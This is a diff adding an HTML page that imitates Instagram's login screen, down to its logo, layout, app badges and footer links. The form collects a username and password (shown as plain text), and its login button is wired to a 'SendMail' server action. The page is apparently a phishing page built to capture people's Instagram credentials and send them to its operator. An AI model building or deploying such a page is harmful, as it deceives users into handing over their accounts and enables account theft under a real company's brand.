@@ -1,0 +1,175 @@
+﻿<html>
+<head>
+    <title>Instagram</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <style>
+        body {
+            background-color: #fafafa;
+            text-align: center;
+            height: 100%;
+        }
+    </style>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
+
+    <!-- Optional theme -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap-theme.min.css" integrity="sha384-6pzBo3FDv/PJ8r2KRkGHifhEocL+1X2rVCTTkUfGk7/0pbek5mMa1upzvWbrUbOZ" crossorigin="anonymous">
+
+    <!-- Latest compiled and minified JavaScript -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div style="display: flex; align-items: stretch; justify-content: center; margin: 32px auto 0; max-width: 935px; padding-bottom: 32px; width: 100%; overflow: hidden;">
+
+        <div style="background-image: url(https://www.instagram.com/static/images/homepage/home-phones@2x.png/9364675fb26a.png); flex-basis: 454px; height: 618px; margin-left: -35px; margin-right: -15px; background-size: 454px 618px;">
+        </div>
+
+        <div style="border-color: black; justify-content: center; margin-top: 12px; max-width: 350px; align-items: center; margin: 0 0 10px;
+    padding: 10px 0;">
+            <div style="background-color: white; width: 350px; height: 380px; border: 1px solid #dbdbdb; margin: 22px auto 12px; align-items: center;">
+                <h1 style="background-image: url(https://www.instagram.com/static/bundles/es6/sprite_core_2x_bcd90c1d4868.png/bcd90c1d4868.png); background-size: 440px 411px; background-repeat: no-repeat;
+      background-position: 0 -130px;
+      height: 51px;
+      width: 175px;
+      align-items: center; margin: 22px auto 12px;">
+                </h1>
+                <div style="margin-bottom: 10px; margin-top: 24px; max-width: 350px; width: 100%; display: flex; flex-direction: column; align-items: stretch;">
+                    <div style=" display: flex; flex-direction: column; justify-content: center;">
+                        <form method="post">
+                            <input type="text" name="login" placeholder="Phone number, username, or email" style="border: 1px solid rgba(var(--ca6,219,219,219),1); border-radius: 3px; margin-top: 24px; margin: 0 40px 6px; stretch">
+                            <input type="text" name="password" placeholder="Password" style="border: 1px solid rgba(var(--ca6,219,219,219),1); border-radius: 3px; margin: 0 40px 6px;">
+                            <button asp-controller="Home" asp-action="SendMail" asp-area="" style="margin-top: 8px; margin-right: 40px; margin-left: 40px; margin-bottom: 8px; justify-content: flex-start; align-items: stretch; background-color: rgba(var(--d69,0,149,246),.3);
+    opacity: 1; border: 1px solid transparent; font-family: Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+    font-size: 14px; text-decoration-color: white;">
+                                Log In
+                            </button>
+                        </form>
+
+                        <div style="flex-direction: row; margin: 10px 40px 18px; align-items: stretch;
+        border: 0 solid #000; padding: 0;
+        display: flex; justify-content: space-around">
+
+
+                            <div style="display: flex; flex-direction: row; align-items: stretch;">
+                                <div style="background-color: rgba(var(--b38,219,219,219),1);
+    height: 1px; top: .45em; background-color: #dbdbdb; flex-grow: 1;"></div>
+                                <div>
+                                    OR
+                                </div>
+                                <div style="background-color: rgba(var(--b38,219,219,219),1);
+    height: 1px;"></div>
+                            </div>
+                        </div>
+
+                        <button style="border: 0; color: #0095f6; color: rgba(var(--d69,0,149,246),1); display: inline; padding: 0; position: relative; background: 0 0; margin-top: 16px; margin-right: 40px; margin-left: 40px; margin-bottom: 8px; flex: 0 0 auto; justify-content: flex-start; font-size: 16">
+                            Log In with Facebook
+                        </button>
+                        <p style="font-size: 12; margin-top: 12px;">Forgot password?</p>
+
+                    </div>
+                </div>
+            </div>
+            <div style="background-color: white; border-color: black; width: 350px; height: auto; align-items: center; border-radius: 1px; margin: 0 0 10px; padding: 10px 0; display: flex; border: 1px solid #dbdbdb; justify-content: center">
+                <div style="font-size: 14px;line-height: 18px;margin: -3px 0 -4px;">
+                    <p style="color: rgba(var(--i1d,38,38,38),1);font-size: 14px; margin: 15px;">
+                        Don't have an account?
+                        <a href="https://www.instagram.com/accounts/emailsignup/" style="color: rgba(var(--d69,0,149,246),1);">
+                            Sign up
+                        </a>
+                    </p>
+
+                </div>
+            </div>
+
+            <div style="display: flex; flex-direction: column;">
+                <p style="font-size: 14px; line-height: 18px; margin: 10px 20px 10px 20px; text-align: center;">
+                    Get the app.
+                </p>
+                <div style="flex-direction: row; justify-content: center; margin: 10px 0 10px 0;">
+                    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
+                        <img style="height: 40px;" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png">
+                    </a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D9A264CDA-D74B-46DD-A8D7-7FD1542FC0F2%26utm_content%3Dlo%26utm_medium%3Dbadge">
+                        <img style="height: 40px;" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png">
+                    </a>
+                </div>
+            </div>
+        </div>
+
+
+
+    </div>
+</body>
+<footer class="footer">
+    <div style="margin-bottom: 52px; flex: 0 0 auto; justify-content: flex-start; align-items: stretch;">
+        <div style="margin-top: 12px; justify-content: flex-start; flex-direction: row; display: flex; justify-content: center;">
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>About</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Blog</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Jobs</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Help</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>API</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Privacy</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Terms</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Top Accounts</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Hashtags</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Location</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Instagram Lite</div>
+            </a>
+        </div>
+
+        <div style="margin-top: 0; justify-content: flex-start; flex-direction: row; display: flex; justify-content: center;">
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Beauty</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Dance</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Fitness</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Food & Drink</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Home & Garden</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Music</div>
+            </a>
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Visual Arts</div>
+            </a>
+        </div>
+
+        <div style="margin-top: 12px; margin-bottom: 12px; justify-content: flex-start; flex-direction: row; display: flex; justify-content: center;">
+            <a href="https://about.instagram.com/" class="bottom-link">
+                <div>Beauty</div>
+            </a>
+            <a href="https://about.instagram.com/blog/" class="bottom-link">
+                <div>Dance</div>
+            </a>
+        </div>
+    </div>
+</footer>
+</html>
